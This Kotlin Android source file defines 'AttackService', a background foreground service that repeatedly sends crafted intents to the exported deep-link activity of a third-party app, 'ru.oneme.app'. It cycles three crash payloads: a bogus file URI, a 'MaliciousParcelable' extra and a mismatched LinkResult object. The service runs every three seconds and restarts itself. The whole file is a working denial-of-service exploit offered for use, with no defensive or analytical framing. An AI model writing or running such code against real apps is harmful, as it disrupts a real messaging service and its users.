package com.example.myapplication2

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import java.io.File
import ru.ok.android.model.links.LinkResult

class AttackService : Service() {

    private val handler = Handler(Looper.getMainLooper())
    private var isAttackRunning = false
    private var attackCounter = 0

    private val attackRunnable = object : Runnable {
        override fun run() {
            if (isAttackRunning) {
                when (attackCounter % 3) {
                    0 -> sendIllegalStateExceptionCrash()
                    1 -> sendClassCastExceptionCrash()
                    2 -> sendBadParcelableCrash()
                }
                attackCounter++
                handler.postDelayed(this, 3000) // Пауза между циклами
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "START") {
            startForegroundService()
            isAttackRunning = true
            handler.post(attackRunnable)
        } else if (intent?.action == "STOP") {
            stopAttack()
        }
        return START_STICKY
    }

    private fun startForegroundService() {
        val channelId = "AttackServiceChannel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Attack Service Channel", NotificationManager.IMPORTANCE_DEFAULT)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("maxim")
            .setContentText("Attack is active in the background.")
            .setSmallIcon(R.mipmap.ic_launcher) // Убедитесь, что иконка существует
            .build()

        startForeground(1, notification)
    }

    private fun sendIllegalStateExceptionCrash() {
        try {
            val crashIntent = Intent(Intent.ACTION_VIEW)
            crashIntent.component = ComponentName("ru.oneme.app", "one.me.android.deeplink.LinkInterceptorActivity")
            crashIntent.data = Uri.fromFile(File("/sdcard/nonexistent.html"))
            crashIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(crashIntent)
        } catch (e: Exception) {}
    }

    private fun sendClassCastExceptionCrash() {
        try {
            val crashIntent = Intent()
            crashIntent.component = ComponentName("ru.oneme.app", "one.me.android.deeplink.LinkInterceptorActivity")
            crashIntent.putExtra("link:result", MaliciousParcelable())
            crashIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(crashIntent)
        } catch (e: Exception) {}
    }

    private fun sendBadParcelableCrash() {
        try {
            val crashIntent = Intent()
            crashIntent.component = ComponentName("ru.oneme.app", "one.me.android.deeplink.LinkInterceptorActivity")
            crashIntent.putExtra("link:result", LinkResult())
            crashIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(crashIntent)
        } catch (e: Exception) {}
    }

    private fun stopAttack() {
        isAttackRunning = false
        handler.removeCallbacks(attackRunnable)
        stopForeground(true)
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        stopAttack()
    }
}